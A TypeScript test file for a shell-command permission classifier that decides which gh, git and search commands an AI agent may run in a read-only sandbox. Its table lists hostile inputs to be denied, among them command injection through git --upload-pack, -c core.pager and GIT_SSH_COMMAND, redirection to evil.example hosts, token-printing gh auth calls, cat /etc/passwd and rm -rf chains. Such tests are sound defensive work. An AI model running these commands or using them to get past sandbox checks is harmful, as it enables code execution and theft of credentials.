import assert from "node:assert/strict";
import { test } from "node:test";
import {
  commandOnlyReads,
  looksLikeNetworkTool,
  looksLikeSearchOnly,
  looksLikeWriteTool,
  permissionPolicyAnswer,
  READ_ONLY_SHELL_HINT,
  sandboxSourceNote,
  securityPolicyAnswer,
} from "../src/lib/permissions";
import { customToolPolicy } from "../electron/custom-tools";
import type { SandboxProfile } from "../src/lib/types";

/**
 * The two calls a reviewer seat was denied for on 8 September 2026, copied off
 * the wire. Both only read. Both were refused "Denied by sandbox: Run a
 * command" on `sandbox: read-only`, because the read table knew git and grep
 * but had never heard of gh, and every shell that was not a search counted as
 * a write.
 */
const LIVE_GH_VIEW = "gh pr view 293 --json number,title,state,headRefName,body";
/**
 * The observed line carried `--repo go7studio/Go7-Workhorse`, and it stays
 * denied. `--repo` points gh at a repository the desk cannot hold to the bound
 * folder, so a seat reading its own checkout drops the flag and lets gh take
 * the repo from the remote. See the flag rows below.
 */
const LIVE_GH_VIEW_WITH_REPO =
  "gh pr view 293 --repo go7studio/Go7-Workhorse --json number,title,state,headRefName,body";
const LIVE_GH_DIFF = "gh pr diff 293";
const LIVE_PYTHON_HEREDOC = `python3 - <<'PY'\nimport pathlib\nprint(pathlib.Path("docs/LINK.md").read_text()[:400])\nPY`;

/** The title the desk's labeller puts on a pasted command (tool-labels.ts). */
const DESK_TITLE = "Run a command";

/**
 * The whole rule in one table: the command, and whether every segment of it
 * classifies as a read. Each row is asserted against the pure function AND
 * against the answer a read-only seat gives, so the two can never drift.
 */
const TABLE: ReadonlyArray<readonly [command: string, reads: boolean, why: string]> = [
  // The two observed denials.
  [LIVE_GH_VIEW, true, "the observed gh pr view --json line, with --repo dropped"],
  [LIVE_GH_VIEW_WITH_REPO, false, "--repo sends the read out of the bound folder"],
  [LIVE_GH_DIFF, true, "the observed gh pr diff"],
  [LIVE_PYTHON_HEREDOC, false, "a heredoc script cannot be read for intent"],

  // gh reads.
  ["gh pr checks 293", true, "pr checks reads"],
  ["gh pr list --state open --limit 20", true, "pr list reads"],
  ["gh pr status", true, "pr status reads"],
  ["gh run view 12345 --log", true, "run view reads"],
  ["gh run list --workflow ci.yml", true, "run list reads"],
  ["gh run watch 12345", true, "run watch reads"],
  ["gh issue view 42", true, "issue view reads"],
  ["gh issue list --label bug", true, "issue list reads"],
  ["gh repo view", true, "repo view reads"],

  // gh writes.
  ["gh pr merge 293 --squash", false, "merge is a write"],
  ["gh pr close 293", false, "close is a write"],
  ["gh pr comment 293 --body hi", false, "comment is a write"],
  ["gh pr create --title x --body y", false, "create is a write"],
  ["gh pr edit 293 --add-label bug", false, "edit is a write"],
  ["gh pr review 293 --approve", false, "review is a write"],
  ["gh repo delete go7studio/x", false, "repo delete is a write"],
  ["gh release create v1", false, "release is not on the read table"],
  ["gh pr", false, "a group with no subcommand is a write"],

  // gh api reaches every path the machine token can reach, and the desk cannot
  // bind a path gh resolves itself. Every form of it is a write.
  ["gh api repos/go7studio/Go7-Workhorse/pulls/293", false, "a plain GET still carries the token"],
  ["gh api --method GET repos/x/y", false, "an explicit GET is still gh api"],
  ["gh api -X GET /rate_limit", false, "-X GET is still gh api"],
  ["gh api /user/emails", false, "the token reads far past the bound folder"],
  ["gh api --hostname=evil.example /user", false, "--hostname names another GitHub"],
  ["gh api -X POST repos/x/y/issues", false, "-X POST is a write"],
  ["gh api -XPOST repos/x/y/issues", false, "the attached -XPOST is a write"],
  ["gh api --method=PATCH /repos/x/y", false, "the joined method is a write"],
  ["gh api -X PUT /repos/x/y", false, "PUT is a write"],
  ["gh api -X DELETE /repos/x/y", false, "DELETE is a write"],
  ["gh api /repos/x/y/issues -f title=bug", false, "a -f field posts a body"],
  ["gh api /repos/x/y/issues -ftitle=hi", false, "the attached -f field posts a body"],
  ["gh api /repos/x/y -F n=@file.json", false, "a -F field posts a body"],
  ["gh api /repos/x/y -Fn=@file.json", false, "the attached -F field posts a body"],
  ["gh api /repos/x/y --input body.json", false, "--input posts a body"],
  ["gh api /repos/x/y --input -", false, "--input from stdin posts a body"],
  ["gh api graphql -f query=x", false, "graphql posts"],

  // Groups that print a credential, named so a later hand cannot call them reads.
  ["gh auth token", false, "auth prints a token"],
  ["gh auth status", false, "auth is never a read"],
  ["gh secret list", false, "secret is never a read"],
  ["gh ssh-key list", false, "ssh-key is never a read"],
  ["gh gpg-key list", false, "gpg-key is never a read"],
  ["gh gist view abc123", false, "gist reaches outside the repo"],
  ["gh alias set co 'pr checkout'", false, "alias set is a write"],
  ["gh extension install owner/x", false, "extension install is a write"],
  ["gh config set editor vim", false, "config set is a write"],

  // A gh read has to stay in the bound repo, in every shape the flag takes.
  ["gh pr view 293 --repo owner/other", false, "--repo leaves the folder"],
  ["gh pr view 293 --repo=owner/other", false, "the joined --repo leaves the folder"],
  ["gh pr diff 293 -R owner/other", false, "-R leaves the folder"],
  ["gh pr diff 293 -Rowner/other", false, "the attached -R leaves the folder"],
  ["gh pr list --hostname ghe.example", false, "--hostname names another GitHub"],
  ["gh run list --hostname=ghe.example", false, "the joined --hostname does too"],

  // A read takes its target as an argument as readily as from a flag, and the
  // desk cannot hold either to the bound folder. So a read names no repository.
  ["gh repo view owner/other", false, "an owner/repo argument leaves the folder"],
  ["gh pr view https://github.com/other/repo/pull/1", false, "a URL leaves the folder"],
  ["gh issue view owner/repo#3", false, "the owner/repo#n form leaves the folder"],
  ["gh pr diff other/repo", false, "and so does a bare owner/repo on diff"],
  ["gh run view github.com/other/repo", false, "a host without a scheme leaves the folder"],
  ["gh repo view", true, "bare repo view resolves the folder's own repo"],
  ["gh pr view 1", true, "a number is a pull request in this repo"],
  ["gh pr view 1 --json title,body", true, "and a --json list is not a repository"],
  ["gh run view 12345", true, "a run id is not a repository"],

  // git reads, including the two added for a reviewer.
  ["git show HEAD --stat", true, "show reads"],
  ["git log --oneline -20", true, "log reads"],
  ["git diff origin/main...HEAD", true, "diff reads"],
  ["git status --short", true, "status reads"],
  ["git branch --all", true, "branch with no name reads"],
  ["git rev-parse HEAD", true, "rev-parse reads"],
  ["git ls-files src", true, "ls-files reads"],
  ["git blame src/lib/permissions.ts", true, "blame reads"],
  ["git fetch origin", true, "a plain fetch brings the branch down"],
  ["git merge-base origin/main HEAD", true, "merge-base reads"],

  // git writes.
  ["git push origin main", false, "push is a write"],
  ["git commit -m x", false, "commit is a write"],
  ["git checkout main", false, "checkout is a write"],
  ["git switch main", false, "switch is a write"],
  ["git reset --hard HEAD~1", false, "reset is a write"],
  ["git rebase main", false, "rebase is a write"],
  ["git merge feature", false, "merge is a write, and is not merge-base"],
  ["git stash", false, "stash is a write"],
  ["git clean -fd", false, "clean is a write"],
  ["git worktree add ../wt main", false, "worktree add is a write"],
  ["git worktree remove ../wt", false, "worktree remove is a write"],
  ["git branch feature-x", false, "naming a branch creates it"],
  ["git branch -d old", false, "-d deletes"],
  ["git fetch origin +refs/heads/*:refs/heads/*", false, "a refspec writes a local ref"],
  ["git fetch --prune origin", false, "--prune deletes refs"],
  ["git log --output=out.txt", false, "--output writes the file"],
  ["git diff --output out.txt", false, "--output writes the file"],

  // A git option that names a program, a path or a config runs before the
  // subcommand gets a say, so "fetch" or "log" at the front proves nothing.
  ["git fetch --upload-pack='sh -c \"rm -rf x\"' origin", false, "--upload-pack runs a command"],
  ["git fetch --upload-pack=/tmp/evil origin", false, "the joined --upload-pack runs a command"],
  ["git ls-remote --upload-pack=/tmp/evil origin", false, "and it is refused wherever it sits"],
  ["git --exec-path=/tmp/evil fetch origin", false, "--exec-path runs another git"],
  ["git --exec-path=/tmp/evil log", false, "--exec-path before any subcommand"],
  ["git --git-dir=/tmp/other log", false, "--git-dir reads another repository"],
  ["git --work-tree=/tmp/other status", false, "--work-tree points at another tree"],
  ["git --namespace=x log", false, "--namespace is a global that redirects refs"],
  ["git --config-env=core.pager=EVIL log", false, "--config-env sets a config"],
  ["git -c core.pager='sh -c \"rm x\"' log", false, "-c sets a config that names a program"],
  ["git -ccore.pager=evil log", false, "the attached -c sets a config too"],
  ["git -C /tmp/other log", false, "-C runs in another folder"],
  ["git -C/tmp/other log", false, "the attached -C runs in another folder"],
  ["git fetch --refmap=+refs/heads/*:refs/heads/* origin", false, "--refmap writes local refs"],
  ["git fetch --recurse-submodules origin", false, "a fetch flag off the short list is a write"],
  ["git fetch --write-commit-graph origin", false, "--write-commit-graph puts files in .git"],
  ["git fetch --auto-maintenance origin", false, "--auto-maintenance repacks"],
  ["git fetch --depth 1 origin", true, "--depth is on the short list"],
  ["git fetch --tags --quiet origin", true, "--tags and --quiet are on the short list"],
  ["git fetch --dry-run origin", true, "--dry-run is on the short list"],
  // The same short flag means different things either side of the subcommand.
  ["git log -c", true, "-c after the subcommand is a combined diff, and reads"],
  ["git show -c HEAD", true, "and so is -c on show"],
  ["git --no-pager log --oneline", true, "a harmless global is still a read"],

  // The existing read programs, and the ones the rule names.
  ["head -40 docs/LINK.md", true, "head reads"],
  ["tail -n 20 docs/FEATURES.md", true, "tail reads"],
  ["wc -l src/lib/permissions.ts", true, "wc reads"],
  ["ls docs", true, "ls reads"],
  ["find . -name '*.ts'", true, "a plain find reads"],
  ["cat notes.md | sed -n '1,20p'", true, "cat into a printing sed reads"],
  ["rg --files", true, "rg reads"],
  ["find . -name x -delete", false, "-delete writes"],
  ["find . -name '*.log' -exec rm {} ;", false, "-exec runs anything"],
  ["find . -name x -ok rm {} ;", false, "-ok runs anything"],

  // Pipelines, joins and subshells: every segment has to classify as a read.
  ["git diff | grep permissions", true, "a read piped into a read"],
  ["gh pr diff 293 | head -100", true, "a gh read piped into a read"],
  ["git log --oneline | head -5 | wc -l", true, "three read stages"],
  ["git status && git diff", true, "&& of two reads"],
  ["git status; git log --oneline", true, "; of two reads"],
  ["git diff | grep x && rm notes.md", false, "one write segment fails the whole line"],
  ["grep foo lib; rm -rf build", false, "a write after a ; is still a write"],
  ["gh pr view 293 && gh pr merge 293", false, "a write after a && is still a write"],
  ["(gh pr diff 293)", false, "a subshell cannot be read by the program at the front"],

  // Redirections that write.
  ["git log > out.txt", false, "> writes"],
  ["gh pr diff 293 >> patch.txt", false, ">> writes"],
  ["gh pr diff 293 | tee patch.txt", false, "tee writes"],

  // Interpreters and escalation stay denied.
  ["python3 script.py", false, "an interpreter is a write"],
  ["node -e 'console.log(1)'", false, "an interpreter is a write"],
  ["bash -c 'gh pr view 293'", false, "a wrapped read is still an interpreter"],
  ["sh -c ls", false, "an interpreter is a write"],
  ["sudo gh pr view 293", false, "sudo is a write"],
  ["eval gh pr view 293", false, "eval is a write"],
  ["git ls-files | xargs rm", false, "xargs with a write is a write"],
  ["gh pr view $(cat id.txt)", false, "a substitution hides the target"],
  ["gh pr view `cat id.txt`", false, "backticks hide the target too"],
  ["cmd /c dir", false, "the Windows interpreter is a write"],
  ["cmd.exe /c gh pr view 293", false, "a wrapped read is still an interpreter"],

  // An environment prefix is not the program. `GIT_DIR=/tmp/other git log`
  // reads another repository, and `GIT_SSH_COMMAND=…` runs a command, so the
  // assignment at the front has to fail the walk rather than be stepped over.
  ["GIT_DIR=/tmp/other git log", false, "an env prefix is not the program git"],
  ["GIT_SSH_COMMAND='sh -c evil' git fetch origin", false, "an env prefix can name a program"],
  ["GH_TOKEN=x gh pr view 293", false, "an env prefix is not the program gh"],
  ["GH_HOST=evil.example gh pr list", false, "an env prefix can redirect the host"],
];

test("the classifier answers every row of the table the same way", () => {
  assert.ok(TABLE.length >= 30, `the table needs at least 30 commands, has ${TABLE.length}`);
  for (const [command, reads, why] of TABLE) {
    assert.equal(commandOnlyReads(command), reads, `${why}: ${command}`);
  }
});

test("a read-only seat allows every read in the table and denies every write", () => {
  for (const [command, reads, why] of TABLE) {
    for (const sandbox of ["read-only", "strict"] as const) {
      const answer = permissionPolicyAnswer({
        mode: "ask",
        sandbox,
        tool: DESK_TITLE,
        detail: JSON.stringify({ command, description: why }),
      });
      assert.equal(
        answer,
        reads ? "once" : "deny",
        `${sandbox} ${reads ? "allows" : "denies"} ${why}: ${command}`,
      );
    }
  }
});

test("the desk's own JSON envelope does not change the answer", () => {
  // Claude sends {"command":…,"description":…}; Codex sends {"cmd":…}. The
  // description is a label, so a write word inside it cannot deny a read and a
  // read word inside it cannot allow a write.
  const allowed = JSON.stringify({ command: LIVE_GH_VIEW, description: "delete the stale review" });
  const denied = JSON.stringify({ cmd: "gh pr merge 293", description: "just reading the pr" });
  assert.equal(looksLikeSearchOnly(DESK_TITLE, allowed), true);
  assert.equal(looksLikeWriteTool(DESK_TITLE, allowed), false);
  assert.equal(looksLikeSearchOnly(DESK_TITLE, denied), false);
  assert.equal(looksLikeWriteTool(DESK_TITLE, denied), true);
});

test("a refusal on a read-only seat says what the seat can run", () => {
  assert.equal(
    READ_ONLY_SHELL_HINT,
    "Read-only sandbox: gh, git and search reads are allowed; interpreters and writes are not.",
  );
  for (const sandbox of ["read-only", "strict"] as const) {
    const note = sandboxSourceNote({ session: { id: "s1", mode: "ask", sandbox } });
    assert.ok(note.startsWith(READ_ONLY_SHELL_HINT), `${sandbox} names what is allowed`);
    assert.match(note, /raise that chat's Sandbox/, "and still names the dial");
  }
  // A seat that is not read-only has nothing extra to say.
  assert.equal(
    sandboxSourceNote({ session: { id: "s1", mode: "ask", sandbox: "workspace" } }).includes(
      READ_ONLY_SHELL_HINT,
    ),
    false,
  );
});

test("every host reaches the same answer, because they share one classifier", () => {
  // custom-tools.ts asks permissionPolicyAnswer, and every ACP host answers
  // through the same call in store.tsx, so Grok, Claude, Codex, Cursor and a
  // custom HTTP bot cannot disagree about what a read is.
  for (const [command, reads, why] of TABLE) {
    const answer = customToolPolicy(
      { id: "t1", name: "run_command", input: { command } },
      { mode: "ask", sandbox: "read-only" },
    );
    assert.equal(answer, reads ? "once" : "deny", `a custom bot agrees on ${why}: ${command}`);
  }
});

test("the security boundary still runs in front of the read table", () => {
  // gh talks to GitHub, so a seat with the network blocked refuses it even
  // though gh pr view is a read.
  assert.equal(looksLikeNetworkTool(DESK_TITLE, LIVE_GH_VIEW), true);
  assert.equal(
    securityPolicyAnswer({
      policy: { network: "blocked", root: "allowed" },
      tool: DESK_TITLE,
      detail: LIVE_GH_VIEW,
    }).answer,
    "deny",
  );
  // The word "gh" in a description is not a network call.
  assert.equal(looksLikeNetworkTool("Task", "weigh the high gh cost"), false);
  // And a gh read still cannot reach outside the bound folder.
  assert.equal(
    securityPolicyAnswer({
      policy: { network: "allowed", root: "blocked" },
      tool: DESK_TITLE,
      detail: JSON.stringify({ command: "cat /etc/passwd" }),
      roots: ["/repo"],
      cwd: "/repo",
    }).answer,
    "deny",
  );
});

test("a seat that can write is unchanged by the read table", () => {
  const sandboxes: SandboxProfile[] = ["off", "workspace"];
  for (const sandbox of sandboxes) {
    assert.equal(
      permissionPolicyAnswer({
        mode: "ask",
        sandbox,
        tool: DESK_TITLE,
        detail: JSON.stringify({ command: "gh pr merge 293" }),
      }),
      null,
      `${sandbox} still asks about a write rather than denying it`,
    );
  }
});
